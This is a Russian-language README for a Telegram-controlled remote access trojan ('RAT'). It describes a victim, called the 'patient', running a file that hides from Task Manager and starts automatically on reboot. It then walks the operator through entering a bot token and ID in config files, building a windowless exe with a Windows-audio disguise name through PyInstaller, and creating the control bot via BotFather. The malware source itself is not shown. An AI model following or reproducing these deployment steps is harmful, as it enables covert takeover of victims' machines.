## 📌 Как это устроено

«Пациент» получает файл, открывает его и запускает — поднимается сервер для
Telegram-бота. Сервер скрывается в диспетчере задач, а после перезагрузки
системы бот стартует автоматически.

> ⚠️ **Важный минус:** граждане РФ без VPN не смогут запустить бота.

## 📋 Инструкция по установке

### Шаг 1. Распаковка

Распакуйте оба файла в одну папку (например, назовём её `RAT`).

### Шаг 2. Настройка `config.py`

Откройте файл `config.py` и найдите строки:

```python
BOT_TOKEN = "Вставь сюда свой токен"
DOCTOR_ID = Сюда ID
```

Впишите свой токен и свой ID, сохраните и закройте файл.

### Шаг 3. Настройка `Хост-Minecrosoft_Windows_Audio.py`

Откройте этот файл и найдите аналогичные строки:

```python
BOT_TOKEN = "Вставь сюда свой токен"
DOCTOR_ID = Сюда ID
```

Впишите те же значения, сохраните и закройте.

### Шаг 4. Сборка в `.exe`

Соберите исполняемый файл через терминал:

```bash
cd "ПУТЬ К ПАПКЕ"
py -m PyInstaller --noconsole --onefile "Хост-Minecrosoft_Windows_Audio.py"
```

Дождитесь окончания сборки.

### Шаг 5. Запуск

Зайдите в папку `dist` и запустите `.exe`. В вашем боте появится сообщение
о том, что бот запущен.

## 🔑 Как узнать токен и ID

### ID

Зайдите в бота **[@userinfobot](https://t.me/userinfobot)** — там будет строка вида:

```
Id:XXXXXXXX
```

### Токен

1. Зайдите в **[@BotFather](https://t.me/BotFather)**.
2. Отправьте команду `/newbot`.
3. Введите имя бота, например `RAT_PLOHO`.
4. Введите username, например `rat_ploho_bot` (суффикс `bot` обязателен).
5. BotFather пришлёт сообщение об успешном создании и сам токен — набор цифр и букв.
